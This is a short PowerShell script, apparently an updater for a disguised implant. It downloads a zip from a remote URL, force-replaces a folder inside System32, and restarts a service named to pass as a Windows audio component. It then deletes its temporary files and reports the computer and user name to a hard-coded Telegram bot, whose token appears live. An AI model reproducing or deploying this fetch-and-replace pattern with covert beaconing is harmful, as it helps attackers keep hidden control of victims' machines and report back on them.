$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId = "5757392163"
$zipUrl = "https://exemplo.com/pasta.zip"
$tempZip = "$env:TEMP\update.zip"
$extractPath = "$env:TEMP\update_extract"
$targetPath = "C:\Windows\System32\ap32\Res-PE"
$serviceName = "Gestor Primario de Audio do Windows"

Invoke-WebRequest -Uri $zipUrl -OutFile $tempZip -UseBasicParsing

if (Test-Path $extractPath) {
    Remove-Item $extractPath -Recurse -Force
}
Expand-Archive -Path $tempZip -DestinationPath $extractPath -Force

if (Test-Path $targetPath) {
    Remove-Item $targetPath -Recurse -Force
}
Copy-Item -Path $extractPath\* -Destination $targetPath -Recurse -Force

Restart-Service -Name $serviceName -Force

Remove-Item $tempZip -Force
Remove-Item $extractPath -Recurse -Force

$msg = "Reload dos Scripts completo em $ComputerName - $UserName"
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
        -Method Post `
        -ContentType "application/json" `
        -Body (@{ chat_id = $chatId; text = $msg } | ConvertTo-Json)